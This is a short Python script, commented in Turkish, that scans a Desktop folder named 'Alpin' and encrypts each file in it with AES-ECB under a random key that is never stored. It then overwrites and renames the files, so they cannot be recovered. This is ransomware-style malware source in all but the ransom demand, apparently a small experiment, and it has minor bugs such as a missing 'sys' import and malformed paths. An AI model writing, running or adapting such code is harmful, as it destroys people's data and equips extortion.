import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import random
from tkinter import *
from Crypto.Random import get_random_bytes

anahtar = get_random_bytes(32)
dosyaadı = []

anahiza = os.path.expanduser('~') + os.sep
masaüstü = anahiza + "Desktop\Alpin"
yol = [masaüstü]

print("Başladı!")


def tara(yol):
    print("Dosyalar taranıyor ...")
    for root, dirs, files in os.walk(yol, topdown=False):
        for file in files:
            dosyayolu = os.path.join(root, file)
            if ".alp" not in dosyayolu:
                dosyaadı.append(dosyayolu)
    print("Dosyalar başarı ile tarandı")


def şifrele(dosyaadı, anahtar):
    global masaüstü
    print("Dosyalar şifreleniyor ...")
    cipher = AES.new(anahtar, AES.MODE_ECB)
    try:
        fb = open(dosyaadı, "rb").read()
        nb = base64.b64encode(cipher.encrypt(pad(fb, 32)))
        print(dosyaadı)

        nf = open(masaüstü + "Şifreli.alp", "wb")
        nf.write(nb)
        nf.flush()
        nf.close()

        tkr = open(masaüstü + "Şifreli.alp", "rb").read()
        tker = open(dosyaadı, "wb")
        tker.write(tkr)
        tker.close()

        os.remove(masaüstü + "Şifreli.alp")
        name = "\Şifreli" + str(random.randint(1, 10000)) + ".Alpin"
        os.rename(dosyaadı, masaüstü + name)
        print("Dosya şifrelenmiştir.")

    except:
        print("Bir Sorun Oluştu.")


def main():
    for x in yol:
        try:
            tara(x)
        except:
            pass

    if len(dosyaadı) != 0:
        for dAdı in dosyaadı:
            şifrele(dAdı, anahtar)
            pass

    else:
        sys.exit()


if __name__ == '__main__':
    main()
